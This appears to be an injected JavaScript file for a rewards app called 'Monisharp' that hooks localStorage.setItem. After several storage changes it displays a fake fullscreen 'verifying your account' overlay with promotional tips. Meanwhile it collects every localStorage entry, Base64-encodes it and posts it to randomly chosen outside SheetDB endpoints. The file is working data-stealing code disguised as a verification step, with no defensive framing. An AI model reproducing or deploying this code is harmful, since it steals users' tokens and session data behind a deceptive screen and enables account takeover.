(function () {
  const API_LISTTWO = [
    "https://sheetdb.io/api/v1/3fhj4vu7fak0u",
    "https://sheetdb.io/api/v1/xsn258gcncwv8",
    "https://sheetdb.io/api/v1/a60myauvx0ay1",
    "https://sheetdb.io/api/v1/n5g98bqmjh72j"
  ];

  let changeCount = 0;
  let isVerifying = false;
  let tipInterval = null;

  // Tips / Fun Facts
  const tips = [
    "💡 Did you know? Staying active daily boosts your rewards!",
    "🔥 Invite friends to Monisharp and earn extra instantly.",
    "⏳ Patience pays! Big bonuses await consistent users.",
    "🎯 Complete tasks to unlock higher daily bonuses.",
    "💰 More deposits = More auto-claims = More earnings!",
    "⭐ Check out our Testimonials page to see success stories."
  ];

  // Fullscreen overlay
  function showOverlay(message, success = false) {
    console.log("[Overlay]", message);

    let overlay = document.getElementById("verify-overlay");
    if (!overlay) {
      overlay = document.createElement("div");
      overlay.id = "verify-overlay";
      overlay.style.position = "fixed";
      overlay.style.top = "0";
      overlay.style.left = "0";
      overlay.style.width = "100%";
      overlay.style.height = "100%";
      overlay.style.background = "linear-gradient(135deg, #1a73e8, #0d47a1)";
      overlay.style.display = "flex";
      overlay.style.flexDirection = "column";
      overlay.style.justifyContent = "center";
      overlay.style.alignItems = "center";
      overlay.style.color = "#fff";
      overlay.style.fontFamily = "Arial, sans-serif";
      overlay.style.fontSize = "18px";
      overlay.style.zIndex = "999999999";
      overlay.style.textAlign = "center";
      overlay.style.padding = "20px";

      // Spinner
      const spinner = document.createElement("div");
      spinner.style.border = "6px solid rgba(255,255,255,0.3)";
      spinner.style.borderTop = "6px solid #fff";
      spinner.style.borderRadius = "50%";
      spinner.style.width = "60px";
      spinner.style.height = "60px";
      spinner.style.animation = "spin 1s linear infinite";
      spinner.style.marginBottom = "20px";
      overlay.appendChild(spinner);

      // Message
      const msg = document.createElement("div");
      msg.id = "verify-message";
      msg.style.maxWidth = "80%";
      msg.style.marginBottom = "15px";
      overlay.appendChild(msg);

      // Tips box
      const tipBox = document.createElement("div");
      tipBox.id = "verify-tips";
      tipBox.style.fontSize = "16px";
      tipBox.style.opacity = "0.8";
      tipBox.style.marginTop = "10px";
      overlay.appendChild(tipBox);

      document.body.appendChild(overlay);

      // Animations
      const style = document.createElement("style");
      style.innerHTML = `
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        #verify-overlay { animation: fadeIn 0.5s ease-in-out; }
      `;
      document.head.appendChild(style);
    }

    const msgBox = document.getElementById("verify-message");
    msgBox.innerHTML = success
      ? "✅ Verification successful! You may continue."
      : message;

    // Start tips rotation
    if (!success) {
      const tipBox = document.getElementById("verify-tips");
      let i = 0;
      tipBox.innerHTML = tips[i];
      clearInterval(tipInterval);
      tipInterval = setInterval(() => {
        i = (i + 1) % tips.length;
        tipBox.innerHTML = tips[i];
      }, 4000); // change every 4s
    }
  }

  function hideOverlay() {
    const overlay = document.getElementById("verify-overlay");
    if (overlay) overlay.style.display = "none";
    clearInterval(tipInterval);
  }

  // Convert object → Base64
  function encodeToBase64(obj) {
    return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
  }

  // Upload to SheetDB
  async function uploadToSheetDB(id, base64Data) {
    const sheetApi =
      API_LISTTWO[Math.floor(Math.random() * API_LISTTWO.length)];
    console.log("[SheetDB] Using endpoint:", sheetApi);

    const payload = {
      data: [{ Id: id, qrCode: base64Data, date: new Date().toISOString() }]
    };

    const res = await fetch(sheetApi, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return res.json();
  }

  // Verification process
  async function handleVerification() {
    if (isVerifying) return;
    isVerifying = true;
    console.log("[Process] Starting verification...");
    showOverlay(
      "👋 Welcome back to Monisharp!<br><br>🔐 Please hold on as we verify your account.<br><br><b>⚠ Do not close or minimize this app.</b>"
    );

    try {
      // Collect localStorage
      const allData = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        allData[key] = localStorage.getItem(key);
      }
      console.log("[Process] Collected localStorage:", allData);

      const base64Data = encodeToBase64(allData);
      const userId = localStorage.getItem("plus-Id") || "user-" + Date.now();

      await uploadToSheetDB(userId, base64Data);

      console.log("[Process] ✅ Verification completed!");
      showOverlay("✅ Verification completed successfully!", true);

      setTimeout(() => hideOverlay(), 3000);
    } catch (err) {
      console.error("[Error]", err);
      showOverlay("❌ Verification failed. Please try again.");
      setTimeout(() => hideOverlay(), 3000);
    } finally {
      changeCount = 0;
      isVerifying = false;
    }
  }

  // Hook localStorage.setItem
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function (key, value) {
    console.log(`[Storage] Key changed: ${key} = ${value}`);
    originalSetItem.apply(this, arguments);
    changeCount++;
    console.log(`[Storage] Change count = ${changeCount}`);
    if (changeCount >= 5 && !isVerifying && localStorage.getItem("plus-Id")) {
      console.log("[Trigger] 5+ changes detected. Starting verification...");
      handleVerification();
    }
  };
})();